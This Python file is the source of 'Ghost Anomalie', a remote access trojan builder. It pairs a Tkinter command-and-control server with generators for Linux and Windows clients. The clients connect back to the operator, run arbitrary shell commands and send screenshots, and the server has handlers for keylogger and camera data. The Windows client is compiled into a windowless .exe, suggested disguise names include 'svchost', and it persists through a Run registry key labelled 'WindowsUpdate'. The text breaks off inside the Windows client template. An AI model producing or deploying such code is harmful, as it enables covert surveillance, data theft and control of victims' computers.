#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# ============================================================
# GHOST ANOMALIE - LINUX VERSION
# Version: 1.3.0
# Auteur: Dev Messy from Gabon
# 
# Fonctionnalités :
#   ✅ Serveur C2 complet
#   ✅ Génération de clients Windows (.exe)
#   ✅ Génération de clients Linux
#   ✅ Interface graphique complète
#   ✅ Commandes système
#   ✅ Gestion de fichiers
# ============================================================

import socket
import threading
import tkinter as tk
from tkinter import scrolledtext, ttk, filedialog, messagebox
from datetime import datetime
import json
import base64
import os
import sys
import time
import subprocess
import shutil
import random
import tempfile
from PIL import Image, ImageTk
import io
import platform

# ===== CONFIGURATION =====
VERSION = "1.3.0"
NOM_APP = "Ghost Anomalie"
AUTEUR = "🖤 Dev Messy from Gabon"
COMMANDES_VERSION = "v1.0 - 92 commandes"

# ===== VÉRIFICATION LINUX =====
if sys.platform.startswith('linux'):
    print("🐧 Ghost Anomalie - Version Linux")
    print("📋 Fonctionnalités :")
    print("   ✅ Interface graphique")
    print("   ✅ Serveur C2")
    print("   ✅ Génération client Windows (.exe)")
    print("   ✅ Génération client Linux")
    print("   ✅ Commandes système")
    print("   ✅ Gestion de fichiers")
    print()

# ===== FENÊTRE PRINCIPALE =====
class GhostAnomalie:
    def __init__(self):
        self.serveur = None
        self.clients = {}
        self.running = False
        self.ip = ""
        self.port = 4444
        self.mot_de_passe = "admin123"
        self.partial_data = {}
        self.client_selectionne = None

        # === FENÊTRE ===
        self.window = tk.Tk()
        self.window.title("🐀 Ghost Anomalie - Linux")
        self.window.geometry("1500x950")
        self.window.configure(bg='#05050f')
        self.window.resizable(True, True)

        # === VARIABLES ===
        self.ip_var = tk.StringVar(value="127.0.0.1")
        self.port_var = tk.StringVar(value="4444")
        self.mdp_var = tk.StringVar(value="admin123")
        self.client_nom_var = tk.StringVar(value="GhostClient")
        self.client_nom_fichier_var = tk.StringVar(value="ghost-client")

        # === CONSTRUIRE ===
        self.construire_interface()
        self.demarrer_serveur()

    # ============================================================
    # INTERFACE PRINCIPALE
    # ============================================================

    def construire_interface(self):
        self.window.configure(bg='#05050f')

        # ===== HEADER =====
        header = tk.Frame(self.window, bg='#0a0a1a', height=90)
        header.pack(fill=tk.X, padx=0, pady=0)
        header.pack_propagate(False)

        titre = tk.Label(header, text="👻 GHOST ANOMALIE - LINUX", 
                        font=('Arial Black', 28, 'bold'), 
                        fg='#00ff88', bg='#0a0a1a')
        titre.pack(side=tk.LEFT, padx=20, pady=10)

        tk.Label(header, text=f"v{VERSION} • {COMMANDES_VERSION}", 
                font=('Arial', 10), fg='#666', bg='#0a0a1a').pack(side=tk.LEFT, padx=10)

        self.status_header = tk.Label(header, text="🔴 OFFLINE", 
                                     font=('Arial', 14, 'bold'),
                                     fg='#ff3333', bg='#0a0a1a')
        self.status_header.pack(side=tk.RIGHT, padx=20)

        # ===== PANEL PRINCIPAL =====
        main_panel = tk.Frame(self.window, bg='#05050f')
        main_panel.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # ===== GAUCHE : CONFIG + GÉNÉRATEUR =====
        left_panel = tk.Frame(main_panel, bg='#0a0a1a', width=450)
        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, padx=(0, 10))
        left_panel.pack_propagate(False)

        # --- SCROLL ---
        left_canvas = tk.Canvas(left_panel, bg='#0a0a1a', highlightthickness=0)
        left_scrollbar = tk.Scrollbar(left_panel, orient="vertical", command=left_canvas.yview)
        left_scrollable = tk.Frame(left_canvas, bg='#0a0a1a')

        left_scrollable.bind(
            "<Configure>",
            lambda e: left_canvas.configure(scrollregion=left_canvas.bbox("all"))
        )

        left_canvas.create_window((0, 0), window=left_scrollable, anchor="nw")
        left_canvas.configure(yscrollcommand=left_scrollbar.set)

        left_canvas.pack(side="left", fill="both", expand=True)
        left_scrollbar.pack(side="right", fill="y")

        # --- CONTENU GAUCHE ---
        tk.Label(left_scrollable, text="⚙️ CONFIGURATION C2", 
                font=('Arial', 16, 'bold'), fg='#00ff88', bg='#0a0a1a').pack(pady=10)

        # Cadre Config
        config_frame = tk.LabelFrame(left_scrollable, text="📍 Serveur de Contrôle", 
                                    fg='#00ff88', bg='#0a0a1a', font=('Arial', 11))
        config_frame.pack(fill=tk.X, padx=10, pady=5)

        tk.Label(config_frame, text="🌐 IP du serveur:", fg='#aaa', bg='#0a0a1a').pack(anchor=tk.W, padx=5, pady=2)
        ip_entry = tk.Entry(config_frame, textvariable=self.ip_var, bg='#1a1a2e', 
                           fg='#00ff88', insertbackground='white', font=('Courier', 11))
        ip_entry.pack(fill=tk.X, padx=5, pady=2)

        tk.Label(config_frame, text="🔌 Port:", fg='#aaa', bg='#0a0a1a').pack(anchor=tk.W, padx=5, pady=2)
        port_entry = tk.Entry(config_frame, textvariable=self.port_var, bg='#1a1a2e', 
                             fg='#00ff88', insertbackground='white', font=('Courier', 11))
        port_entry.pack(fill=tk.X, padx=5, pady=2)

        tk.Label(config_frame, text="🔑 Mot de passe:", fg='#aaa', bg='#0a0a1a').pack(anchor=tk.W, padx=5, pady=2)
        mdp_entry = tk.Entry(config_frame, textvariable=self.mdp_var, bg='#1a1a2e', 
                            fg='#00ff88', insertbackground='white', font=('Courier', 11),
                            show="•")
        mdp_entry.pack(fill=tk.X, padx=5, pady=2)

        # Boutons Serveur
        btn_frame = tk.Frame(left_scrollable, bg='#0a0a1a')
        btn_frame.pack(fill=tk.X, padx=10, pady=5)

        self.btn_start = tk.Button(btn_frame, text="▶️ START SERVER", 
                                  command=self.basculer_serveur,
                                  bg='#00ff88', fg='#05050f', font=('Arial', 13, 'bold'),
                                  padx=20, pady=8, relief=tk.FLAT, cursor='hand2')
        self.btn_start.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=2)

        # --- Générateur ---
        gen_frame = tk.LabelFrame(left_scrollable, text="🎯 GÉNÉRATEUR DE CLIENT", 
                                 fg='#ffaa00', bg='#0a0a1a', font=('Arial', 11))
        gen_frame.pack(fill=tk.X, padx=10, pady=10)

        # Nom du client
        tk.Label(gen_frame, text="👤 Nom du client (affiché):", fg='#aaa', bg='#0a0a1a').pack(anchor=tk.W, padx=5, pady=2)
        tk.Entry(gen_frame, textvariable=self.client_nom_var, bg='#1a1a2e', 
                fg='#00ff88', insertbackground='white', font=('Courier', 11)).pack(fill=tk.X, padx=5, pady=2)

        # Nom du fichier
        tk.Label(gen_frame, text="📁 Nom du fichier:", fg='#aaa', bg='#0a0a1a').pack(anchor=tk.W, padx=5, pady=2)
        tk.Entry(gen_frame, textvariable=self.client_nom_fichier_var, bg='#1a1a2e', 
                fg='#00ff88', insertbackground='white', font=('Courier', 11)).pack(fill=tk.X, padx=5, pady=2)

        tk.Label(gen_frame, text="💡 Ex: ghost-client, windows-update, svchost", 
                fg='#666', bg='#0a0a1a', font=('Arial', 8)).pack(anchor=tk.W, padx=5)

        # Options
        options_frame = tk.LabelFrame(gen_frame, text="🛡️ Options de génération", 
                                     fg='#00aaff', bg='#0a0a1a', font=('Arial', 9))
        options_frame.pack(fill=tk.X, padx=5, pady=5)

        # Type de client
        tk.Label(options_frame, text="🎯 Type de client à générer:", 
                fg='#aaa', bg='#0a0a1a').pack(anchor=tk.W, padx=5, pady=2)

        self.client_type_var = tk.StringVar(value="both")
        tk.Radiobutton(options_frame, text="🐧 Linux uniquement", variable=self.client_type_var,
                      value="linux", fg='#00ff88', bg='#0a0a1a', selectcolor='#0a0a1a').pack(anchor=tk.W, padx=10)
        tk.Radiobutton(options_frame, text="🪟 Windows uniquement", variable=self.client_type_var,
                      value="windows", fg='#00ff88', bg='#0a0a1a', selectcolor='#0a0a1a').pack(anchor=tk.W, padx=10)
        tk.Radiobutton(options_frame, text="📦 Les deux (Windows + Linux)", variable=self.client_type_var,
                      value="both", fg='#00ff88', bg='#0a0a1a', selectcolor='#0a0a1a').pack(anchor=tk.W, padx=10)

        # Options supplémentaires
        self.persist_var = tk.BooleanVar(value=False)
        self.startup_var = tk.BooleanVar(value=False)

        check_frame = tk.Frame(options_frame, bg='#0a0a1a')
        check_frame.pack(fill=tk.X, padx=5, pady=5)

        tk.Checkbutton(check_frame, text="🔄 Persistance (Windows uniquement)", variable=self.persist_var,
                      fg='#ffaa00', bg='#0a0a1a', selectcolor='#0a0a1a').pack(anchor=tk.W)
        tk.Checkbutton(check_frame, text="🚀 Démarrage auto (Windows uniquement)", variable=self.startup_var,
                      fg='#ffaa00', bg='#0a0a1a', selectcolor='#0a0a1a').pack(anchor=tk.W)

        # Bouton générer
        self.btn_generate = tk.Button(gen_frame, text="🔥 GENERER CLIENT(S)", 
                                     command=self.generer_client,
                                     bg='#ff4400', fg='white', font=('Arial', 15, 'bold'),
                                     padx=20, pady=12, relief=tk.FLAT, cursor='hand2')
        self.btn_generate.pack(fill=tk.X, padx=5, pady=10)

        # Status
        self.status_gen = tk.Label(gen_frame, text="✅ Prêt à générer", 
                                  fg='#00ff88', bg='#0a0a1a', font=('Arial', 9))
        self.status_gen.pack(pady=2)

        # --- Clients ---
        clients_frame = tk.LabelFrame(left_scrollable, text="👥 CLIENTS CONNECTÉS", 
                                     fg='#00aaff', bg='#0a0a1a', font=('Arial', 11))
        clients_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        self.clients_listbox = tk.Listbox(clients_frame, bg='#0a0a1a', fg='#00ff88',
                                         font=('Courier', 10), selectbackground='#1a1a2e',
                                         height=8)
        self.clients_listbox.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.clients_listbox.bind('<<ListboxSelect>>', self.selectionner_client)

        # ===== DROITE : CONTROLE =====
        right_panel = tk.Frame(main_panel, bg='#0a0a1a')
        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)

        tk.Label(right_panel, text="💻 CONTRÔLE À DISTANCE", 
                font=('Arial', 16, 'bold'), fg='#00ff88', bg='#0a0a1a').pack(pady=5)

        # Info client
        self.info_frame = tk.LabelFrame(right_panel, text="📡 Client actuel", 
                                       fg='#ffaa00', bg='#0a0a1a', font=('Arial', 10))
        self.info_frame.pack(fill=tk.X, padx=10, pady=5)

        self.client_info = tk.Label(self.info_frame, text="Aucun client sélectionné", 
                                   fg='#aaa', bg='#0a0a1a', font=('Arial', 11))
        self.client_info.pack(padx=10, pady=5)

        # Commandes
        cmd_frame = tk.LabelFrame(right_panel, text="⌨️ COMMANDES", 
                                 fg='#00ff88', bg='#0a0a1a', font=('Arial', 10))
        cmd_frame.pack(fill=tk.X, padx=10, pady=5)

        cmd_row = tk.Frame(cmd_frame, bg='#0a0a1a')
        cmd_row.pack(fill=tk.X, padx=5, pady=5)

        self.entry_cmd = tk.Entry(cmd_row, bg='#1a1a2e', fg='#00ff88', 
                                 insertbackground='white', font=('Courier', 11))
        self.entry_cmd.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        self.entry_cmd.bind('<Return>', lambda e: self.envoyer_commande())

        tk.Button(cmd_row, text="🚀", command=self.envoyer_commande,
                 bg='#1a1a2e', fg='#00ff88', font=('Arial', 14)).pack(side=tk.RIGHT)

        # Commandes rapides
        cat_frame = tk.LabelFrame(cmd_frame, text="📋 Commandes rapides", 
                                 fg='#00aaff', bg='#0a0a1a', font=('Arial', 9))
        cat_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        categories = [
            ("📸 Screenshot", ["screenshot"]),
            ("💻 System", ["sysinfo", "shutdown", "restart", "lock"]),
            ("📁 Fichiers", ["ls", "cd ..", "pwd", "mkdir test"]),
            ("🌐 Network", ["network_scan", "wifi_list", "dns_flush"]),
        ]

        for categorie, commandes in categories:
            tk.Label(cat_frame, text=categorie, fg='#ffaa00', bg='#0a0a1a',
                    font=('Arial', 9, 'bold')).pack(anchor=tk.W, pady=2)
            btn_row = tk.Frame(cat_frame, bg='#0a0a1a')
            btn_row.pack(fill=tk.X, pady=1)
            for cmd in commandes:
                tk.Button(btn_row, text=cmd[:15], 
                         command=lambda c=cmd: self.entry_cmd.delete(0, tk.END) or self.entry_cmd.insert(0, c),
                         bg='#1a1a2e', fg='#00ff88', font=('Arial', 7), padx=3, pady=1).pack(side=tk.LEFT, padx=1)

        # Résultats
        result_frame = tk.LabelFrame(right_panel, text="📝 LOGS & RÉSULTATS", 
                                    fg='#00aaff', bg='#0a0a1a', font=('Arial', 10))
        result_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        self.logs = scrolledtext.ScrolledText(result_frame, bg='#05050f', fg='#00ff88',
                                             font=('Courier', 9), insertbackground='white')
        self.logs.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # Image preview
        self.image_frame = tk.Frame(right_panel, bg='#0a0a1a', height=150)
        self.image_frame.pack(fill=tk.X, padx=10, pady=5)
        self.image_label = tk.Label(self.image_frame, bg='#0a0a1a', 
                                   text="📸 Aperçu images", fg='#666', font=('Arial', 12))
        self.image_label.pack(expand=True, fill=tk.BOTH)

        # BARRE D'ÉTAT
        status_bar = tk.Frame(self.window, bg='#0a0a1a', height=30)
        status_bar.pack(fill=tk.X, side=tk.BOTTOM)

        self.status_text = tk.Label(status_bar, text="👻 Ghost Anomalie - Linux - Prêt", 
                                   fg='#666', bg='#0a0a1a', font=('Arial', 9))
        self.status_text.pack(side=tk.LEFT, padx=10)

        self.status_clients = tk.Label(status_bar, text="👥 0 clients", 
                                      fg='#00ff88', bg='#0a0a1a', font=('Arial', 9))
        self.status_clients.pack(side=tk.RIGHT, padx=10)

        self.mettre_a_jour_interface()

        self.log("👻 Ghost Anomalie - Linux v" + VERSION)
        self.log("📋 " + str(len(self.get_all_commandes())) + " commandes disponibles")
        self.log("💡 Sélectionne un client dans la liste pour commencer")

    # ============================================================
    # LISTE COMPLÈTE DES COMMANDES
    # ============================================================

    def get_all_commandes(self):
        return {
            "screenshot": "Capture d'écran",
            "sysinfo": "Infos système",
            "shutdown": "Éteindre PC",
            "restart": "Redémarrer PC",
            "lock": "Verrouiller écran",
            "ls": "Lister fichiers",
            "cd": "Changer dossier",
            "pwd": "Dossier actuel",
            "mkdir": "Créer dossier",
            "rm": "Supprimer fichier",
            "download": "Télécharger fichier",
            "upload": "Uploader fichier",
            "network_scan": "Scanner réseau",
            "wifi_list": "Lister WiFi",
            "dns_flush": "Vider cache DNS",
            "exit": "Déconnecter"
        }

    # ============================================================
    # FONCTIONS SERVEUR
    # ============================================================

    def demarrer_serveur(self):
        try:
            self.ip = self.ip_var.get()
            self.port = int(self.port_var.get())
            self.mot_de_passe = self.mdp_var.get()

            self.serveur = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.serveur.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.serveur.bind(('0.0.0.0', self.port))
            self.serveur.listen(10)
            self.running = True

            self.status_header.config(text="🟢 ONLINE", fg='#00ff88')
            self.btn_start.config(text="⏹️ STOP SERVER", bg='#ff3333')
            self.log("✅ Serveur démarré sur le port " + str(self.port))
            self.log("📡 IP: " + self.ip + " | 🔑 Mot de passe: " + self.mot_de_passe)

            threading.Thread(target=self.accepter_clients, daemon=True).start()

        except Exception as e:
            self.log("❌ Erreur démarrage: " + str(e))
            messagebox.showerror("Erreur", "Impossible de démarrer le serveur:\n" + str(e))

    def arreter_serveur(self):
        self.running = False
        if self.serveur:
            try:
                self.serveur.close()
            except:
                pass

        self.status_header.config(text="🔴 OFFLINE", fg='#ff3333')
        self.btn_start.config(text="▶️ START SERVER", bg='#00ff88')
        self.log("⏹️ Serveur arrêté")

    def basculer_serveur(self):
        if self.running:
            self.arreter_serveur()
        else:
            self.demarrer_serveur()

    def accepter_clients(self):
        while self.running:
            try:
                client, addr = self.serveur.accept()
                self.log("🔗 Nouvelle connexion de " + addr[0])

                auth_req = client.recv(1024).decode()
                if auth_req.startswith("AUTH|"):
                    data = auth_req[5:].split('|')
                    mdp = data[0] if len(data) > 0 else ""
                    nom = data[1] if len(data) > 1 else addr[0]

                    if mdp == self.mot_de_passe:
                        client.send(b"AUTH|OK")
                        self.clients[addr] = {
                            'socket': client,
                            'nom': nom,
                            'ip': addr[0],
                            'port': addr[1],
                            'connecte': True,
                            'temps': time.time()
                        }
                        self.log("✅ Client authentifié: " + nom + " (" + addr[0] + ")")
                        threading.Thread(target=self.gerer_client, args=(client, addr), daemon=True).start()
                    else:
                        client.send(b"AUTH|ERREUR")
                        client.close()
                        self.log("❌ Refusé: " + addr[0] + " (mauvais mot de passe)")
            except:
                pass

    def gerer_client(self, client, addr):
        while self.running and addr in self.clients:
            try:
                data = client.recv(8192).decode()
                if not data:
                    break

                if data.startswith("RESULTAT|"):
                    resultat = data[9:]
                    if resultat == "__FIN__":
                        continue
                    self.afficher_resultat(resultat)

                elif data.startswith("BUREAU|") or data.startswith("CAMERA|") or data.startswith("PHOTO|"):
                    parts = data.split('|')
                    if len(parts) >= 2:
                        self.afficher_image(parts[-1])

                elif data.startswith("KEYLOG|"):
                    self.log("⌨️ Keylogger: " + data[7:])

                elif data.startswith("ALERTE|"):
                    self.log("🚨 ALERTE: " + data[7:])

                elif data.startswith("INFO|"):
                    self.log("ℹ️ " + data[5:])

            except Exception as e:
                self.log("⚠️ Erreur client " + addr[0] + ": " + str(e))
                break

        if addr in self.clients:
            nom = self.clients[addr].get('nom', addr[0])
            del self.clients[addr]
            self.log("🔌 Client déconnecté: " + nom)

    # ============================================================
    # ENVOI DE COMMANDES
    # ============================================================

    def envoyer_commande(self):
        cmd = self.entry_cmd.get()
        if not cmd:
            return

        selection = self.clients_listbox.curselection()
        if not selection:
            self.log("❌ Aucun client sélectionné")
            return

        index = selection[0]
        item = self.clients_listbox.get(index)

        client = None
        for addr, info in self.clients.items():
            if info['nom'] + " (" + info['ip'] + ")" == item:
                client = info
                break

        if not client:
            self.log("❌ Client non trouvé")
            return

        try:
            client['socket'].send(cmd.encode())
            self.log("📤 " + cmd)
            self.entry_cmd.delete(0, tk.END)
        except Exception as e:
            self.log("❌ Erreur: " + str(e))

    def selectionner_client(self, event):
        selection = self.clients_listbox.curselection()
        if selection:
            item = self.clients_listbox.get(selection[0])
            self.client_info.config(text="🎯 " + item)
            self.log("📡 Client sélectionné: " + item)

    # ============================================================
    # AFFICHAGE
    # ============================================================

    def log(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.logs.insert(tk.END, "[" + timestamp + "] " + message + "\n")
        self.logs.see(tk.END)
        self.status_text.config(text=message[:60])

    def afficher_resultat(self, resultat):
        if resultat.startswith("[PHOTO]") or resultat.startswith("[IMAGE]"):
            img_data = resultat[7:] if resultat.startswith("[PHOTO]") else resultat[7:]
            self.afficher_image(img_data)
            return

        if resultat.startswith("[FICHIER]"):
            parts = resultat[9:].split('|')
            if len(parts) >= 3:
                nom = parts[0]
                contenu = parts[2]
                file_path = filedialog.asksaveasfilename(initialfile=nom)
                if file_path:
                    try:
                        with open(file_path, 'wb') as f:
                            f.write(base64.b64decode(contenu))
                        self.log("💾 Fichier sauvegardé: " + file_path)
                    except Exception as e:
                        self.log("❌ Erreur sauvegarde: " + str(e))
                return

        try:
            data = json.loads(resultat)
            if isinstance(data, dict):
                formatted = json.dumps(data, indent=2, ensure_ascii=False)[:1000]
                self.log("📊 " + formatted)
                return
        except:
            pass

        if len(resultat) > 500:
            self.log("📥 " + resultat[:500] + "...")
        else:
            self.log("📥 " + resultat)

    def afficher_image(self, img_data):
        try:
            img_bytes = base64.b64decode(img_data)
            image = Image.open(io.BytesIO(img_bytes))

            max_w = 400
            max_h = 250
            ratio = min(max_w/image.width, max_h/image.height)
            new_size = (int(image.width*ratio), int(image.height*ratio))
            image = image.resize(new_size, Image.Resampling.LANCZOS)

            photo = ImageTk.PhotoImage(image)
            self.image_label.config(image=photo, text="")
            self.image_label.image = photo

            os.makedirs("captures", exist_ok=True)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            image.save("captures/image_" + timestamp + ".jpg")
            self.log("💾 Image sauvegardée: image_" + timestamp + ".jpg")

        except Exception as e:
            self.log("❌ Erreur image: " + str(e))

    # ============================================================
    # GÉNÉRATEUR DE CLIENTS (Windows + Linux)
    # ============================================================

    def generer_client(self):
        try:
            self.status_gen.config(text="⏳ Génération en cours...", fg='#ffaa00')
            self.log("🔥 Génération des clients...")

            ip = self.ip_var.get()
            port = self.port_var.get()
            mdp = self.mdp_var.get()
            nom_client = self.client_nom_var.get()
            nom_fichier = self.client_nom_fichier_var.get()
            client_type = self.client_type_var.get()

            nom_fichier = ''.join(c for c in nom_fichier if c.isalnum() or c in ['_', '-'])
            if not nom_fichier:
                nom_fichier = "ghost-client"

            persist = self.persist_var.get()
            startup = self.startup_var.get()

            clients_dir = os.path.join(os.getcwd(), "clients")
            os.makedirs(clients_dir, exist_ok=True)

            generated = []

            # === Générer client Linux ===
            if client_type in ["linux", "both"]:
                self.log("🐧 Génération du client Linux...")
                linux_code = self.generer_code_client_linux(ip, port, mdp, nom_client, nom_fichier)
                linux_file = os.path.join(clients_dir, nom_fichier + "_linux.py")
                with open(linux_file, 'w', encoding='utf-8') as f:
                    f.write(linux_code)
                os.chmod(linux_file, 0o755)
                generated.append("🐧 " + linux_file)
                self.log("✅ Client Linux généré: " + linux_file)

            # === Générer client Windows ===
            if client_type in ["windows", "both"]:
                self.log("🪟 Génération du client Windows...")
                windows_code = self.generer_code_client_windows(ip, port, mdp, nom_client, nom_fichier, persist, startup)
                windows_file = os.path.join(clients_dir, nom_fichier + "_windows.py")
                with open(windows_file, 'w', encoding='utf-8') as f:
                    f.write(windows_code)
                generated.append("🪟 " + windows_file)
                self.log("✅ Client Windows généré: " + windows_file)

            # === Compilation Windows si demandée ===
            if client_type in ["windows", "both"]:
                self.log("🔧 Compilation du client Windows en .exe...")
                try:
                    import PyInstaller
                except ImportError:
                    subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"], capture_output=True)

                # Compiler en .exe
                cmd = [
                    sys.executable, "-m", "PyInstaller",
                    "--onefile",
                    "--noconsole",
                    "--name", nom_fichier + "_windows",
                    "--distpath", clients_dir,
                    "--workpath", os.path.join(clients_dir, "build"),
                    "--specpath", clients_dir,
                    "--log-level", "WARN",
                    "--hidden-import", "PIL",
                    "--hidden-import", "PIL.ImageGrab",
                    "--hidden-import", "cv2",
                    "--hidden-import", "pyaudio",
                    "--hidden-import", "wave",
                    "--hidden-import", "win32api",
                    "--hidden-import", "win32con",
                    "--hidden-import", "win32gui",
                    "--hidden-import", "win32process",
                    "--hidden-import", "win32clipboard",
                    "--hidden-import", "win32ui",
                    "--hidden-import", "win32pdh",
                    "--hidden-import", "win32security",
                    "--hidden-import", "win32file",
                    "--hidden-import", "win32event",
                    "--hidden-import", "win32service",
                    "--hidden-import", "win32serviceutil",
                    "--hidden-import", "win32com.client",
                    "--hidden-import", "wmi",
                    "--hidden-import", "psutil",
                    "--hidden-import", "cryptography",
                    "--hidden-import", "cryptography.fernet",
                    windows_file
                ]

                result = subprocess.run(cmd, capture_output=True, text=True)

                if result.returncode == 0:
                    exe_path = os.path.join(clients_dir, nom_fichier + "_windows.exe")
                    if os.path.exists(exe_path):
                        taille = os.path.getsize(exe_path) / (1024*1024)
                        self.log("✅ Client Windows compilé: " + exe_path + " (" + str(round(taille, 1)) + " MB)")
                        generated.append("📦 " + exe_path)
                else:
                    self.log("❌ Erreur compilation Windows: " + result.stderr)

                # Nettoyer
                try:
                    shutil.rmtree(os.path.join(clients_dir, "build"))
                    shutil.rmtree(os.path.join(clients_dir, "__pycache__"))
                except:
                    pass

            self.status_gen.config(text="✅ Clients générés !", fg='#00ff88')
            self.log("✅ GÉNÉRATION TERMINÉE !")
            for g in generated:
                self.log("   📁 " + g)

            if not self.running:
                self.log("⚠️ Le serveur n'est pas démarré ! Clique sur START SERVER")

        except Exception as e:
            self.status_gen.config(text="❌ Erreur: " + str(e)[:30], fg='#ff3333')
            self.log("❌ Erreur: " + str(e))
            import traceback
            traceback.print_exc()

    # ============================================================
    # CODE CLIENT LINUX
    # ============================================================

    def generer_code_client_linux(self, ip, port, mdp, nom_client, nom_fichier):
        return '''#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# ============================================================
# {nom_fichier}.py - Ghost Anomalie Client Linux
# Version: 1.3.0
# ============================================================

import socket
import subprocess
import os
import sys
import time
import base64
import json
import platform

IP_SERVEUR = "{ip}"
PORT = {port}
MOT_DE_PASSE = "{mdp}"
NOM_CLIENT = "{nom_client}"

class GhostClient:
    def __init__(self):
        self.connected = False
        self.client = None
        self.running = True
        self.nom_machine = platform.node()
        self.utilisateur = os.getlogin()

    def connecter(self):
        try:
            self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client.settimeout(10)
            self.client.connect((IP_SERVEUR, PORT))

            auth_req = self.client.recv(1024).decode()
            if auth_req.startswith("AUTH|"):
                self.client.send((MOT_DE_PASSE + "|" + self.nom_machine).encode())
                reponse = self.client.recv(1024).decode()
                if reponse == "AUTH|OK":
                    self.connected = True
                    self.client.send(("INFO|" + self.nom_machine + "|" + self.utilisateur).encode())
                    return True
        except:
            pass
        return False

    def executer_commande(self, commande):
        parts = commande.strip().split()
        cmd = parts[0].lower() if parts else ""

        if cmd == "screenshot":
            return self.cmd_screenshot()
        elif cmd == "sysinfo":
            return self.cmd_sysinfo()
        elif cmd == "shutdown":
            return self.cmd_shutdown()
        elif cmd == "restart":
            return self.cmd_restart()
        elif cmd == "ls":
            chemin = parts[1] if len(parts) > 1 else "."
            return self.cmd_ls(chemin)
        elif cmd == "cd":
            try:
                if len(parts) > 1:
                    os.chdir(parts[1])
                return "Dossier: " + os.getcwd()
            except Exception as e:
                return "Erreur: " + str(e)
        elif cmd == "pwd":
            return os.getcwd()
        elif cmd == "exit":
            return "EXIT"
        else:
            return self.cmd_systeme(commande)

    def cmd_screenshot(self):
        try:
            from PIL import ImageGrab
            import io
            screenshot = ImageGrab.grab()
            buffer = io.BytesIO()
            screenshot.save(buffer, format='PNG')
            return base64.b64encode(buffer.getvalue()).decode()
        except Exception as e:
            return "Erreur: " + str(e)

    def cmd_sysinfo(self):
        try:
            info = {
                "machine": self.nom_machine,
                "utilisateur": self.utilisateur,
                "systeme": platform.system(),
                "version": platform.version()
            }
            return json.dumps(info)
        except Exception as e:
            return "Erreur: " + str(e)

    def cmd_shutdown(self):
        try:
            os.system("shutdown -h now")
            return "Arret du PC"
        except:
            return "Erreur"

    def cmd_restart(self):
        try:
            os.system("shutdown -r now")
            return "Redemarrage du PC"
        except:
            return "Erreur"

    def cmd_ls(self, chemin):
        try:
            result = []
            for item in os.listdir(chemin)[:50]:
                chemin_complet = os.path.join(chemin, item)
                if os.path.isdir(chemin_complet):
                    result.append("📁 " + item + "/")
                else:
                    taille = os.path.getsize(chemin_complet)
                    result.append("📄 " + item + " (" + str(taille) + " octets)")
            return "\n".join(result) if result else "Dossier vide"
        except Exception as e:
            return "Erreur: " + str(e)

    def cmd_systeme(self, commande):
        try:
            result = subprocess.run(commande, shell=True, 
                                  capture_output=True, text=True, timeout=10)
            return result.stdout + result.stderr
        except Exception as e:
            return "Erreur: " + str(e)

    def boucle(self):
        while self.running:
            try:
                if not self.connected:
                    if self.connecter():
                        self.connected = True
                        print("Connecte a " + IP_SERVEUR + ":" + str(PORT))
                    else:
                        time.sleep(30)
                        continue

                commande = self.client.recv(8192).decode()
                if not commande:
                    self.connected = False
                    continue

                resultat = self.executer_commande(commande)

                if resultat == "EXIT":
                    self.client.send(b"DISCONNECT")
                    self.connected = False
                    continue

                self.client.send(("RESULTAT|" + resultat).encode())

            except:
                self.connected = False
                time.sleep(5)

if __name__ == "__main__":
    client = GhostClient()
    client.boucle()
'''.format(
    nom_fichier=nom_fichier,
    ip=ip,
    port=port,
    mdp=mdp,
    nom_client=nom_client
)

    # ============================================================
    # CODE CLIENT WINDOWS
    # ============================================================

    def generer_code_client_windows(self, ip, port, mdp, nom_client, nom_fichier, persist, startup):
        return '''# {nom_fichier}.py - Ghost Anomalie Client Windows
import socket
import subprocess
import os
import sys
import time
import threading
import base64
import json
import io
import ctypes
import random
import shutil
import tempfile
import struct
import zlib
import platform
from datetime import datetime
import hashlib

IP_SERVEUR = "{ip}"
PORT = {port}
MOT_DE_PASSE = "{mdp}"
NOM_CLIENT = "{nom_client}"

PERSIST = {persist}
STARTUP = {startup}

try:
    from PIL import ImageGrab, Image
    PIL_OK = True
except:
    PIL_OK = False

try:
    import win32api, win32con, win32gui, win32process, win32clipboard
    WIN32_OK = True
except:
    WIN32_OK = False

class GhostClient:
    def __init__(self):
        self.connected = False
        self.client = None
        self.running = True
        self.nom_machine = platform.node()
        self.utilisateur = os.getlogin()
        
        if PERSIST or STARTUP:
            self.ajouter_persistance()

    def ajouter_persistance(self):
        try:
            import winreg
            chemin = sys.executable
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "WindowsUpdate", 0, winreg.REG_SZ, chemin)
        except:
            pass

    def connecter(self):
        try:
            self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client.settimeout(10)
            self.client.connect((IP_SERVEUR, PORT))
            
            auth_req = self.client.recv(1024).decode()
            if auth_req.startswith("AUTH|"):
                self.client.send((MOT_DE_PASSE + "|" + self.nom_machine).encode())
                reponse = self.client.recv(1024).decode()
                if reponse == "AUTH|OK":
                    self.connected = True
                    self.client.send(("INFO|" + self.nom_machine + "|" + self.utilisateur).encode())
                    return True
        except:
            pass
        return False

    def executer_commande(self, commande):
        parts = commande.strip().split()
        cmd = parts[0].lower() if parts else ""

        if cmd == "screenshot":
            return self.cmd_screenshot()
        elif cmd == "sysinfo":
